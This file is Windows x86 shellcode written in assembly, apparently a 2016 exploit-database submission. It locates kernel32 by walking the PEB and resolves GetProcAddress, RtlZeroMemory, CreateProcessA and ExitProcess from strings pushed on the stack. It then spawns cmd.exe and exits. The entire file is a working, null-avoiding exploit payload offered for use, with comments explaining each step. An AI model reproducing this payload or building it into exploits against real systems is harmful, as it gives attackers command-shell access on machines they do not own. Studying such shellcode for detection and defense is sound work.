; Title : Windows x86 CreateProcessA(NULL,"cmd.exe",NULL,NULL,0,NULL,NULL,NULL,&STARTUPINFO,&PROCESS_INFORMATION) shellcode
; Author : Roziul Hasan Khan Shifat
; Date : 15-08-2016

section .text

global _start
_start:

xor ecx,ecx
mov eax,[fs:ecx+0x30] 				; PEB
mov eax,[eax+0xc] 				; PEB->ldr
mov esi,[eax+0x14] 				; PEB->ldr.InMemOrderModuleList
lodsd
xchg esi,eax
lodsd
mov ecx,[eax+0x10] 				; kernel32 base address
xor ebx,ebx
mov ebx,[ecx+0x3c] 				; DOS->elf_anew
add ebx,ecx 					; PE HEADER
mov ebx,[ebx+0x78] 				; DataDirectory->VirtualAddress
add ebx,ecx 					; IMAGE_EXPORT_DIRECTORY
mov esi,[ebx+0x20] 				; AddressOfNames
add esi,ecx

;---------------------------------------------

xor edx,edx
func:
	inc edx
	lodsd
	add eax,ecx
	cmp dword [eax],'GetP'			; "GetP"
	jnz func
	cmp dword [eax+4],'rocA'		; "rocA"
	jnz func
	cmp dword [eax+8],'ddre'		; "ddre"
	jnz func

;--------------------------------

mov esi,[ebx+0x1c] 				; AddressOfFunctions
add esi,ecx
mov edx,[esi+edx*4]
add edx,ecx 					; GetProcAddress()

;-------------------------------------
mov esi,edx					
mov edi,ecx		
;-------------------------

xor ebx,ebx					; Clear reg

; Using GetProcAddress, finding address of RtlZeroMemory()
; FARPROC GetProcAddress(
;   HMODULE hModule,
;   LPCSTR  lpProcName
; );
push 0x41414179					; "yAAA"
mov [esp+1],word bx				; Remove the last A's
push 0x726f6d65					; "emor"
push 0x4d6f7265					; "eroM"
push 0x5a6c7452					; "RtlZ"
push esp					; Push string reference
push ecx					; GetProcAddress()
call edx					; Call function

;------------------------------
add esp,16
;-----------------------------------

; zero out 84 bytes
; void RtlZeroMemory(
;    Destination,
;    Length
; );
xor ecx,ecx					; Clear reg
mov edx,ecx					; Clear reg
mov dl,84					; Length of memory to clear
push ecx					; Push length
sub esp,84					
lea ecx,[esp]					; Reference to length
push ecx					
push edx
push ecx
call eax					; Call function

;----------------------------

; Finding address of CreateProcessA()
; FARPROC GetProcAddress(
;   HMODULE hModule,
;   LPCSTR  lpProcName
; );
pop ecx
xor edx,edx
push 0x42424173					; "sABB"
mov [esp+2],word dx				; Clear B's from string
push 0x7365636f					; "oces"
push 0x72506574					; "tePr"
push 0x61657243					; "Crea"
lea edx,[esp]					; Load stringreference in EDX
push ecx
push edx
push edi
call esi					; Call function

;--------------------------------
	; BOOL CreateProcessA(
	;   LPCSTR                lpApplicationName,
	;   LPSTR                 lpCommandLine,
	;   LPSECURITY_ATTRIBUTES lpProcessAttributes,
	;   LPSECURITY_ATTRIBUTES lpThreadAttributes,
	;   BOOL                  bInheritHandles,
	;   DWORD                 dwCreationFlags,
	;   LPVOID                lpEnvironment,
	;   LPCSTR                lpCurrentDirectory,
	;   LPSTARTUPINFOA        lpStartupInfo,
	;   LPPROCESS_INFORMATION lpProcessInformation
	; );
; CreateProcessA(NULL,"cmd.exe",NULL,NULL,0,NULL,NULL,NULL,&STARTUPINFO,&PROCESS_INFORMATION)
pop ecx
add esp,16
xor ebx,ebx
push 0x41657865					; "exeA"
mov [esp+3],byte bl				; Delete last A
push 0x2e646d63					; "cmd."
lea ebx,[esp]					; Load stringreference in EBX
xor edx,edx
mov dl,68
mov [ecx],edx
lea edx,[ecx+68]
push esi
xor esi,esi
push edx
push ecx
push esi
push esi
push esi
push esi
push esi
push esi
push ebx
push esi
call eax					; Call function
pop esi

;-------------------------------------
;finding address of ExitProcess()
; FARPROC GetProcAddress(
;   HMODULE hModule,
;   LPCSTR  lpProcName
; );
add esp,8
xor ebx,ebx
push 0x41737365					; "essA"
mov [esp+3],byte bl				; Delete last A
push 0x636f7250					; "Proc"
push 0x74697845					; "Exit"
lea ebx,[esp]					; Load stringreference in EBX
push ebx					; Push stringreference
push edi					; 
call esi					; Call function

;-----------------------
	; ExitProcess(0)
	; void ExitProcess(
	;  UINT uExitCode
	; );
; ExitProcess(0)
xor ecx,ecx					; Clear register
push ecx					; Push NULL
call eax					; Call function

